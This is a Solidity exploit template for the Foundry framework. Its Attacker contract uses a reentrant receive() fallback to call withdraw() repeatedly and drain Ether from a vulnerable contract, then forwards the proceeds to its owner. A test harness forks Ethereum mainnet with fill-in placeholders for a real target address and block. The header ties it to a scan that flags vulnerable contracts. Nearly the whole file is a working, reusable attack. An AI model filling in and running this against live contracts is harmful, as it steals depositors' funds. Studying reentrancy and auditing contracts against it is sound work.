// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.20;

/*
    Reentrancy template -- exploit a missing CEI pattern via fallback.

    Use when source-risk scan flags a contract using low-level .call() before
    updating state (classic reentrancy footprint).

    FILL: TARGET, FORK_BLOCK, INITIAL_DEPOSIT, WITHDRAW_FN_SIG
*/

import "forge-std/Test.sol";

interface IVuln {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

contract Attacker {
    IVuln target;
    uint256 chunk;
    uint256 calls;
    address owner;

    constructor(address _target, uint256 _chunk) {
        target = IVuln(_target);
        chunk = _chunk;
        owner = msg.sender;
    }

    function pwn() external payable {
        require(msg.value >= chunk, "send seed");
        target.deposit{value: chunk}();
        target.withdraw(chunk);
        payable(owner).transfer(address(this).balance);
    }

    // Reentrant fallback: re-enter withdraw until target is drained or 8 hops
    receive() external payable {
        if (++calls < 8 && address(target).balance >= chunk) {
            target.withdraw(chunk);
        }
    }
}

contract ReentrancyExploit is Test {
    address constant TARGET   = address(0x0000000000000000000000000000000000000000); // FILL
    uint256 constant FORK_BLOCK = 22487000; // FILL
    uint256 constant CHUNK    = 1 ether;    // FILL: amount per re-entry hop

    address attacker = makeAddr("attacker");

    function setUp() public {
        string memory rpc = vm.envOr("FOUNDRY_RPC_URL", string("https://eth.llamarpc.com"));
        vm.createSelectFork(rpc, FORK_BLOCK);
        vm.deal(attacker, 10 ether);
    }

    function test_reentrancyDrains() public {
        uint256 targetBefore = TARGET.balance;
        require(targetBefore >= CHUNK * 4, "Target underfunded for meaningful drain test");

        vm.prank(attacker);
        Attacker a = new Attacker(TARGET, CHUNK);

        vm.prank(attacker);
        a.pwn{value: CHUNK}();

        uint256 targetAfter = TARGET.balance;
        // Pass = target drained more than initial deposit (attacker pulled real funds)
        assertLt(targetAfter, targetBefore - CHUNK,
                 "Reentrancy did not extract funds; CEI may be intact");
    }
}
